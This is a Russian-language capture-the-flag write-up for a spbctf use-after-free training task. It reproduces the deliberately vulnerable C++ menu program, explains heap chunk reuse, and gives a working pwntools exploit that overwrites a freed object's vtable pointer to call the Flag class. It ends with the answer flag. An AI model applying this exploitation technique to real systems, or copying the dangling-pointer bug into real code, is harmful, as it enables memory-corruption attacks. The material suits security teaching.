[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn8_mc4)
Описание:
Use-After-Free for Fun 🤹
`nc 109.233.56.90 11728`
**[mc4.elf](https://pwn.spbctf.ru/files/uaf/mc4/mc4.elf)**  
**[mc4.cpp](https://pwn.spbctf.ru/files/uaf/mc4/mc4.cpp)**

Исходный код:
``` c++
#include <iostream>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

using namespace std;

class Data {
    public:
    virtual void Display() {
        cout << "Can't display abstract data\n";
    }
    
    virtual void Modify() {
        cout << "Can't modify abstract data\n";
    }
};

class Array: public Data {
    public:
    int size;
    double * data;
    
    Array(int len, double * mem) {
        size = len;
        data = mem;
    }
    
    void Display() {
        cout << size << " numbers: ";
        for (int i = 0; i < size; i++) {
            cout << data[i] << " ";
        }
        cout << "\n";
    }
    
    void Modify() {
        int idx;
        cout << "Which number to change (0-" << (size - 1) << "): ";
        cin >> idx;
        
        if (idx < 0 || idx >= size) {
            cout << "Bad number index\n";
            return;
        }
        
        cout << "Enter new number at " << idx << ": ";
        cin >> data[idx];
    }
};

class Flag: public Data {
    public:
    
    void Display() {
        cout << "The flag is:\n";
        system("cat flag.txt");
    }
};

Data * DATAS[100];
int COUNT = 0;

Flag FLAG;

void add_array() {
    if (COUNT >= 100) {
        cout << "Too many datas already\n";
        return;
    }
    
    int len;
    
    cout << "Enter array size: ";
    cin >> len;

    double * mem = new double[len];
    
    Array * arr = new Array(len, mem);
    
    cout << "Enter " << len << " numbers: ";
    for (int i = 0; i < len; i++) {
        cin >> arr->data[i];
    }
    DATAS[COUNT++] = arr;

    cout << "Added!\n";
}

void display_element() {
    int i;
    
    cout << "Enter data index to display: ";
    cin >> i;
    
    if (i < 0 || i >= COUNT) {
        cout << "Wrong index\n";
        return;
    }
    
    DATAS[i]->Display();
}

void modify_element() {
    int i;
    
    cout << "Enter data index to modify: ";
    cin >> i;
    
    if (i < 0 || i >= COUNT) {
        cout << "Wrong index\n";
        return;
    }
    
    DATAS[i]->Modify();
}

void remove_element() {
    int i;
    
    cout << "Enter data index to remove: ";
    cin >> i;
    
    if (i < 0 || i >= COUNT) {
        cout << "Wrong index\n";
        return;
    }
    
    Array * arr = (Array *)DATAS[i];
    delete arr->data;
    delete DATAS[i];
    
    cout << "Element freed\n";
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    
    cout << "Hello-hello!\n";
    cout << "Welcome to the UAF Fun House\n";
    cout << "Be sure to check out the Flag class!\n";
    
    while (1) {
        string choice;
        
        cout << "\nMENU:\n";
        cout << "  (current count: " << COUNT << ")\n";
        cout << "a - add array\n";
        cout << "d - display element\n";
        cout << "m - modify element\n";
        cout << "r - remove element\n";
        cout << "choice: ";
        alarm(120);
        cin >> choice;
        if (choice == "") {
            return 0;
        }
        
        if (choice == "a") {
            add_array();
        } else if (choice == "d") {
            display_element();
        } else if (choice == "m") {
            modify_element();
        } else if (choice == "r") {
            remove_element();
        }
    }
}

```

После удаления объекта структура второго объекта ложится на место, где был массив (т.к. куча работает по принципу FIFO). Число 3 при аллокации выбрало не случайно `3 * 8 = 24` - максимальный размер объекта кучи, который занимает 1 чанк.
Класс занимает `8 + 4 + 8 = 20` байт, если выделять более 24-х элементов, то вторая структура может записаться на новую область памяти, а не старую.
```
// таблица адресов = 8 байт
int size;
double * data;
```
![{9B17139A-F6A5-4640-8C49-52C9C6AE15FC}](../../../../z.%20Images/{9B17139A-F6A5-4640-8C49-52C9C6AE15FC}.png)

План атаки:
1. Создать массив из 3-х элементов.
2. Удалить его.
3. Создать второй массив размера 1 и положить туда адрес таблицы адресов Flag.
4. Вывести массив 0.

Эксплоит:
``` python
import struct

payload = struct.unpack('d', b'\x68\x2D\x60'.ljust(8, b'\x00'))
payload = payload[0]

io = start()

io.sendlineafter(b'choice: ', b'a')        # создание первой структуры
io.sendlineafter(b'size: ', b'3')
io.sendlineafter(b'numbers: ', b'1 2 3')

io.sendlineafter(b'choice: ', b'r')        # удаление первой структуры
io.sendlineafter(b'remove: ', b'0')

io.sendlineafter(b'choice: ', b'a')        # создание второй структуры
io.sendlineafter(b'size: ', b'1')
io.sendlineafter(b'numbers: ', str(payload).encode())

io.sendlineafter(b'choice: ', b'd')        # чтение флага
io.sendlineafter(b'display: ', b'0')

io.interactive()
```

Запуск:
![{C4FB8D63-CFCA-473B-A60E-01B4F779039F}](../../../../z.%20Images/{C4FB8D63-CFCA-473B-A60E-01B4F779039F}.png)

Ответ: `spbctf{f57aa5acea8810dc431e0f6101f65a5c}`